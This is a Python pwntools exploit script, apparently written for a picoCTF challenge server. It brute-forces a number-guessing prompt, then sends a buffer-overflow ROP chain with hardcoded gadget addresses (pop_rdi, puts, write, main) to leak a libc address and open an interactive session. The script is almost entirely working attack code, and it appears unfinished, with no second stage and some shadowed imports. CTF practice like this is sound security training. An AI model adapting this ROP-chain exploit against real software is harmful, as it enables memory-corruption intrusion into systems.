#!/cygdrive/c/Users/nofil.qasim/AppData/Local/Programs/Python/Python39/python.exe

from os import write
from pwn import log, process, remote, context
from pwnlib import context
from pwnlib.util.packing import p64, u64

def bruteforce(p : remote):
    for i in range (10000000):
        response = p.recvuntil(b'?')
        log.info(f'{response=}')
        i = str(i)
        log.info(f'{i=}')
        p.sendline(i)

        response = p.recvline()
        log.info(f'{response=}')
        response = p.recvline()
        log.info(f'{response=}')  
        
        if response.__contains__(b'Congrats!'):
            break


def main():
    context.log_level = 'debug'
    #p = process('./vulnlocal.exe')
    p = remote('jupiter.challenges.picoctf.org', 51462)

    padding     = b'A'*120
    main        = 0x400c8c
    ret         = 0x400416
    puts        = 0x411120
    pop_rdi     = 0x400696
    read        = 0x44a6a0
    write       = 0x44a770
    read_libc   = 0x273226058b
    write_libc  = 0x273156058b

    bruteforce(p)
   
    exploit = padding + p64(pop_rdi) + p64(write) + p64(puts) + p64(main)
    p.sendlineafter('Name?', exploit)

    response = p.recvline()
    response = u64(p.recvline().strip().ljust(8, b'\x00'))
    response = u64(p.recvline().strip().ljust(8, b'\x00'))
    log.info(f'Leaked read address -> {hex(response)}')

    p.interactive()


if __name__ == '__main__':
    main()